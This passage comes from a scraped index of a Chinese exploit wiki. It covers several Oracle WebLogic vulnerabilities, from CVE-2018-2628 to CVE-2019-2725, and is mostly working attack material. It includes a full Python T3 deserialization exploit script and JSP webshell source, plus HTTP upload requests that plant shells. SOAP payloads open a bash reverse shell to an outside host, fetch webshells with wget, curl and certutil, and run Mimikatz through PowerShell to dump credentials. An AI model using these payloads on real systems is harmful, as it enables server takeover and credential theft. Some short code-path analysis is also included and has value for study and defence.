则var4.toByteArray()先转换成字节数组，传入ByteArrayInputStream转换成输入流，跟进WorkContextXmlInputAdapter，在WorkContextXmlInputAdapter.class内，WorkContextXmlInputAdapter接收输入流，并将输入流转换成XMLDecoder对象，这时如果再调用XMLDecoder的readObject()方法对其进行反序列化即可造成命令执行。其实在this.receive(var6);中，进行了多层调用最终到达readObject，下面会省略过多无关调试，记录xml反序列化相关： 下面是对WorkContextXmlInputAdapter和创建xml反序列化对象后如何执行的readObject方法造成rce的代码跟踪 WorkContextXmlInputAdapter.class // // Source code recreated from a .class file by IntelliJ IDEA // (powered by Fernflower decompiler) // package weblogic.wsee.workarea; import java.beans.XMLDecoder; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; import java.io.NotSerializableException; import weblogic.workarea.WorkContext; import weblogic.workarea.WorkContextInput; public final class WorkContextXmlInputAdapter implements WorkContextInput { private final XMLDecoder xmlDecoder; public WorkContextXmlInputAdapter(InputStream var1) { this.xmlDecoder = new XMLDecoder(var1); // WorkContextXmlInputAdapter构造函数，将输入流转换成XMLDecoder反序列化对象 } public WorkContextXmlInputAdapter(XMLDecoder var1) { this.xmlDecoder = var1; } public String readASCII() throws IOException { return (String)this.xmlDecoder.readObject(); } public WorkContext readContext() throws IOException, ClassNotFoundException { Class var1 = Class.forName(this.readASCII()); try { WorkContext var2 = (WorkContext)var1.newInstance(); var2.readContext(this); return var2; } catch (InstantiationException var3) { throw (IOException)(new NotSerializableException(\"WorkContext must have a public no-arg constructor\")).initCause(var3); } catch (IllegalAccessException var4) { throw (IOException)(new NotSerializableException(\"WorkContext must have a public no-arg constructor\")).initCause(var4); } } public void readFully(byte[] var1) throws IOException { byte[] var2 = (byte[])((byte[])this.xmlDecoder.readObject()); System.arraycopy(var2, 0, var1, 0, var2.length); } public void readFully(byte[] var1, int var2, int var3) throws IOException { byte[] var4 = (byte[])((byte[])this.xmlDecoder.readObject()); System.arraycopy(var4, 0, var1, var2, var3); } public int skipBytes(int var1) throws IOException { throw new UnsupportedOperationException(); } public boolean readBoolean() throws IOException { return (Boolean)this.xmlDecoder.readObject(); } public byte readByte() throws IOException { return (Byte)this.xmlDecoder.readObject(); } public int readUnsignedByte() throws IOException { return (Integer)this.xmlDecoder.readObject(); } public short readShort() throws IOException { return (Short)this.xmlDecoder.readObject(); } public int readUnsignedShort() throws IOException { return (Integer)this.xmlDecoder.readObject(); } public char readChar() throws IOException { return (Character)this.xmlDecoder.readObject(); } public int readInt() throws IOException { return (Integer)this.xmlDecoder.readObject(); } public long readLong() throws IOException { return (Long)this.xmlDecoder.readObject(); } public float readFloat() throws IOException { return (Float)this.xmlDecoder.readObject(); } public double readDouble() throws IOException { return (Double)this.xmlDecoder.readObject(); } public String readLine() throws IOException { return (String)this.xmlDecoder.readObject(); } public String readUTF() throws IOException { return (String)this.xmlDecoder.readObject(); } public static void main(String[] var0) throws Exception { XMLDecoder var1 = new XMLDecoder(new FileInputStream(var0[0])); WorkContextXmlInputAdapter var2 = new WorkContextXmlInputAdapter(var1); System.out.println(var2.readASCII()); System.out.println(var2.readInt()); byte[] var3 = new byte[20]; var2.readFully(var3); System.out.println(var3); System.out.println(var2.readBoolean()); System.out.println(var2.readByte()); System.out.println(var2.readShort()); System.out.println(var2.readChar()); System.out.println(var2.readInt()); System.out.println(var2.readLong()); System.out.println(var2.readFloat()); System.out.println(var2.readDouble()); System.out.println(var2.readUTF()); System.out.println(var2.readUTF()); System.out.println(var2.readUTF()); } } WorkContextXmlInputAdapter->new XMLDecoder(var1) WorkContextEntrylmpl.class public static WorkContextEntry readEntry(WorkContextInput var0) throws IOException, ClassNotFoundException { String var1 = var0.readUTF(); return (WorkContextEntry)(var1.length() == 0 ? NULL_CONTEXT : new WorkContextEntryImpl(var1, var0)); } 第72行，readUTF() WorkContextXmlInputAdapter.class 第103行 public String readUTF() throws IOException { return (String)this.xmlDecoder.readObject(); } 当WorkContextEntrylmpl.class中的readUTF执行完成之后，返回反序列化的字符串，rce也执行完成！8 weglogic log: /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-19 12:16:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2018-2628）.html":{"url":"0day/Weblogic/（CVE-2018-2628）.html","title":"（CVE-2018-2628）","keywords":"","body":"（CVE-2018-2628） 一、漏洞简介 二、漏洞影响 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.2.0 Oracle WebLogic Server12.2.1.3.0 三、复现过程 Usage: cve-2018-2628 127.0.0.1 7001 #!env python #coding=utf-8 import sys import socket import time import re VUL=['CVE-2018-2628'] PAYLOAD=['aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078'] VER_SIG=['\\\\$Proxy[0-9]+'] def t3handshake(sock,server_addr): sock.connect(server_addr) sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex')) time.sleep(1) sock.recv(1024) print 'handshake successful' def buildT3RequestObject(sock,port): data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport)) data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [data1,data2,data3,data4]: sock.send(d.decode('hex')) time.sleep(2) print 'send request payload successful,recv length:%d'%(len(sock.recv(2048))) def sendEvilObjData(sock,data): payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload+=data payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload) sock.send(payload.decode('hex')) time.sleep(2) sock.send(payload.decode('hex')) res = '' try: while True: res += sock.recv(4096) time.sleep(0.1) except Exception as e: pass return res def checkVul(res,server_addr,index): p=re.findall(VER_SIG[index], res, re.S) if len(p)>0: print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index]) else: print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index]) def run(dip,dport,index): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整 sock.settimeout(65) server_addr = (dip, dport) t3handshake(sock,server_addr) buildT3RequestObject(sock,dport) rs=sendEvilObjData(sock,PAYLOAD[index]) print 'rs',rs checkVul(rs,server_addr,index) if __name__==\"__main__\": if len(sys.argv) 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-19 12:17:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2018-2893）.html":{"url":"0day/Weblogic/（CVE-2018-2893）.html","title":"（CVE-2018-2893）","keywords":"","body":"CVE-2018-2893 一、漏洞简介 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/CVE-2018-2893 Step 1 java -jar ysoserial-cve-2018-2893.jar WHY SO SERIAL? Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]' Available payload types: Payload Authors Dependencies ------- ------- ------------ JRMPClient @mbechler JRMPClient2 JRMPClient3 JRMPClient4 Jdk7u21 @frohoff Step 2 java -jar ysoserial-cve-2018-2893.jar JRMPClient4 \":\" > poc4.ser Step 3 python weblogic.py poc4.ser 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-19 12:18:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2018-2894）.html":{"url":"0day/Weblogic/（CVE-2018-2894）.html","title":"（CVE-2018-2894）","keywords":"","body":"（CVE-2018-2894）WebLogic任意文件上传 一、漏洞简介 二、漏洞影响 漏洞影响版本：10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3 三、复现过程 下载地址：http://download.oracle.com/otn/nt/middleware/12c/12213/fmw_12.2.1.3.0_wls_quick_Disk1_1of1.zip 漏洞复现 服务启动后，访问 http://localhost:7001/ws_utc/config.do 可以将当前的工作目录为更改为其他目录。以本地环境为例，可以部署到 C:\\Oracle\\Middleware\\Oracle_Home\\user_projects\\domains\\base_domain\\servers\\AdminServer\\tmp\\_WL_internal\\com.oracle.webservices.wls.ws-testclient-app-wls\\4mcj4y\\war 选择右边的安全栏目，添加JKS Keystores上传文件。假设chybeta.jsp内容如下： \"); Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"cmd\")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> 抓包获取到时间戳为1531987145013，则上传到的位置即config\\keystore\\1531987145013_chybeta.jsp 访问http://localhost:7001/ws_utc/config/keystore/1531987145013_chybeta.jsp 简要漏洞分析 在ws-testpage-impl.jar!/com/oracle/webservices/testclient/setting/TestClientWorkDirManager.class:59: public void changeWorkDir(String path) { String[] oldPaths = this.getRelatedPaths(); if (this.testPageProvider.getWsImplType() == ImplType.JRF) { this.isWorkDirChangeable = false; this.isWorkDirWritable = isDirWritable(path); this.isWorkDirChangeable = true; this.setTestClientWorkDir(path); } else { this.persistWorkDir(path); this.init(); } if (this.isWorkDirWritable) { String[] newPaths = this.getRelatedPaths(); moveDirs(oldPaths, newPaths); } else { Logger.fine(\"[INFO] Newly specified TestClient Working Dir is readonly. Won't move the configuration stuff to new path.\"); } } 此函数用于改变工作目录，但其中并未做任何检测。 在ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/res/SettingResource.class:181中： @Path(\"/keystore\") @POST @Produces({\"application/xml\", \"application/json\"}) @Consumes({\"multipart/form-data\"}) public Response editKeyStoreSettingByMultiPart(FormDataMultiPart formPartParams) { if (!RequestUtil.isRequstedByAdmin(this.request)) { return Response.status(Status.FORBIDDEN).build(); } else { if (TestClientRT.isVerbose()) { Logger.fine(\"calling SettingResource.addKeyStoreSettingByMultiPart\"); } String currentTimeValue = \"\" + (new Date()).getTime(); KeyValuesMap formParams = RSDataHelper.getInstance().convertFormDataMultiPart(formPartParams, true, TestClientRT.getKeyStorePath(), currentTimeValue); .... } } 跟入ws-testpage-impl.jar!/com/oracle/webservices/testclient/core/ws/cdf/config/parameter/TestClientRT.class:31 public static String getKeyStorePath() { return getConfigDir() + File.separator + \"keystore\"; } 得到要写入的路径storePath。 在ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/util/RSDataHelper.class:145: public KeyValuesMap convertFormDataMultiPart(FormDataMultiPart formPartParams, boolean isExtactAttachment, String path, String fileNamePrefix) { ... if (attachName != null && attachName.trim().length() > 0) { if (attachName != null && attachName.trim().length() != 0) { attachName = this.refactorAttachName(attachName); if (fileNamePrefix == null) { fileNamePrefix = key; } String filename = (new File(storePath, fileNamePrefix + \"_\" + attachName)).getAbsolutePath(); kvMap.addValue(key, filename); if (isExtactAttachment) { this.saveAttachedFile(filename, (InputStream)bodyPart.getValueAs(InputStream.class)); } } } ... } 把上传文件的内容传到了storePath目录里，文件名满足fileNamePrefix + \"_\" + attachName。这过程没有任何过滤和检查：）… 利用条件： 需要知道部署应用的web目录 ws_utc/config.do在开发模式下无需认证，在生产模式下需要认证。具体可见Oracle® Fusion Middleware Administering Web Services 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 23:52:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2018-3191）.html":{"url":"0day/Weblogic/（CVE-2018-3191）.html","title":"（CVE-2018-3191）","keywords":"","body":"（CVE-2018-3191） 一、漏洞简介 二、漏洞影响 weblogic-spring-jndi-12.2.1.3.jar 对于weblogic： 12.2.1.3weblogic-spring-jndi-10.3.6.0.jar 对于weblogic： 10.3.6.012.2.1.012.1.3.012.2.1.1 三、复现过程 http://0-sec.org/download/CVE-2018-3191.zip 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 22:27:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2018-3245）.html":{"url":"0day/Weblogic/（CVE-2018-3245）.html","title":"（CVE-2018-3245）","keywords":"","body":"（CVE-2018-3245） 一、漏洞简介 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/CVE-2018-3245 Step 1 java -jar ysoserial-cve-2018-3245.jar WHY SO SERIAL? Usage: java -jar ysoserial-cve-2018-3245.jar [payload] '[command]' Available payload types: Payload Authors Dependencies ------- ------- ------------ CVE_2018_2893_1 @mbechler CVE_2018_2893_2 @mbechler CVE_2018_2893_3 @mbechler CVE_2018_3245 @mbechler JRMPClient @mbechler Jdk7u21 @frohoff Step 2 java -jar ysoserial-cve-2018-3245.jar CVE_2018_3245 \"[RMI_SERVICE_IP]:[PORT]\" > poc5.ser Step 3 python weblogic.py [TARGET_HOST] [PORT] poc5.ser 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 22:31:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2019-2618）.html":{"url":"0day/Weblogic/（CVE-2019-2618）.html","title":"（CVE-2019-2618）","keywords":"","body":"cve-2019-2618 一、漏洞简介 Weblogic Upload Vuln(Need username password)-CVE-2019-2618 二、漏洞影响 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.3.0 三、复现过程 https://github.com/ianxtianxt/cve-2019-2618 python使用 python CVE-2019-2618.py url username password 解密weblogic密码 root@f0cb7e674d7e:~/Oracle# cat /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties |grep pass password={AES}dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU= root@f0cb7e674d7e:~/Oracle# find / -name \"*SerializedSystemIni.dat*\" /root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat root@f0cb7e674d7e:~/Oracle# weblogic 账号密码： weblogic/Oracle@123 使用docker搭建环境 参考vulnhub root@kali:~/vulhub/weblogic/CVE-2017-10271# ls 1.png docker-compose.yml README.md set_mirror.sh root@kali:~/vulhub/weblogic/CVE-2017-10271# docker-compose up -d POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1 Host: 10.10.20.166:7001 Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.21.0 username: weblogic wl_request_type: app_upload cache-control: no-cache wl_upload_application_name: /../tmp/_WL_internal/bea_wls_internal/9j4dqk/war serverName: Jas502n password: Oracle@123 content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW archive: true server_version: 10.3.6.0 wl_upload_delta: true Content-Length: 1081 ------WebKitFormBoundary7MA4YWxkTrZu0gW Content-Disposition: form-data; name=\"shell.jsp\"; filename=\"shell.jsp\" Content-Type: false Commands with JSP \"); Process p; if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){ p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\")); } else{ p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> ------WebKitFormBoundary7MA4YWxkTrZu0gW-- 也可以换个目录上传 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/bea_wls_deployment_internal.war /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/bea_wls_internal.war 这是上传的路径 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_deployment_internal bea_wls_internal bea_wls_deployment_internal 在同目录 这是漏洞war位置 POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1 Host: 10.10.20.166:7001 Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.21.0 username: weblogic wl_request_type: app_upload cache-control: no-cache wl_upload_application_name: /../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war serverName: Jas502n password: Oracle@123 content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW archive: true server_version: 10.3.6.0 wl_upload_delta: true Content-Length: 1084 ------WebKitFormBoundary7MA4YWxkTrZu0gW Content-Disposition: form-data; name=\"shell.jsp\"; filename=\"shell111.jsp\" Content-Type: false Commands with JSP \"); Process p; if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){ p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\")); } else{ p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> ------WebKitFormBoundary7MA4YWxkTrZu0gW-- 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-19 12:17:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2019-2725）（CNVD-C-2019-48814）.html":{"url":"0day/Weblogic/（CVE-2019-2725）（CNVD-C-2019-48814）.html","title":"（CVE-2019-2725）","keywords":"","body":"（CVE-2019-2725）（CNVD-C-2019-48814） 一、漏洞简介 二、漏洞影响 Oracle WebLogic Server 10.x Oracle WebLogic Server 12.1.3 三、复现过程 访问http://www.0-sec.org/_async/AsyncResponseService 若出现以上情况，则有可能会存在漏洞。 Win/Linux 通用写入shell代码（一） POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 1142 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xxxxservers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"\"); } %>]]> 执行完之后访问 http://www.0-sec.org/_async/webshell.jsp?pwd=123&cmd=whoami Win/Linux 通用写入shell代码（二） POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 1136 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xxxxservers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.jsp\"); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(\"\"); } %>]]> 执行完之后访问 http://www.0-sec.org/bea_wls_internal/webshell.jsp?pwd=123&cmd=whoami (注：上述报文中servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/，servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/ 均为默认路径，如果路径修改，可以配合反弹shell进行获取) Linux 反弹shell POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 853 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx /bin/bash -c bash -i &gt;&amp; /dev/tcp/vpsip/vpsport 0&gt;&amp;1 写入webshell（需要公网） //这里提供两个代码 需要自己在公网上放置一个webshell.txt webshell地址：http://www.0-sec.org/_async/webshell.jsp POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 789 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx /bin/bash -c wget http://vpsip:vpsport/webshell.txt -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 789 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx /bin/bash -c curl http://vpsip:vpsport/webshell.txt -o servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp 写入webshell（无需公网） //这里提供两个代码 POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.50.219:7001 Content-Length: 1378 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx /bin/bash -c echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp 写入的webshell地址为：http://www/0-sec.org/_async/webshell.jsp?pwd=123&cmd=whoami POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.50.219:7001 Content-Length: 1376 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx /bin/bash -c echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell.jsp 写入的webshell地址为：http://www.0-sec.org/bea_wls_internal/webshell.jsp?pwd=123&cmd=whoami Win 反弹shell 可直接使用CobaltStrike生成一个payload.ps1 powershell脚本，将该脚本放到公网上，然后使用如下报文即可 POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 861 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c powershell \"IEX (New-Object Net.WebClient).DownloadString('http://ip:port/payload.ps1'); Invoke-Mimikatz -DumpCreds\" 写入webshell（需要公网） //这里提供两个代码 需要自己在公网上放置一个webshell.txt webshell地址为：http://www.0-sec.org/_async/webshell.jsp POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 854 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c powershell (new-object System.Net.WebClient).DownloadFile( 'http://ip:port/webshell.txt','servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp') POST /_async/AsyncResponseService HTTP/1.1 Host: ip:port Content-Length: 854 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml xx xx cmd /c certutil -urlcache -split -f http://ip:port/webshell.txt servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp 写入webshell （无需公网） //这里提供四个代码 前两组代码 POST 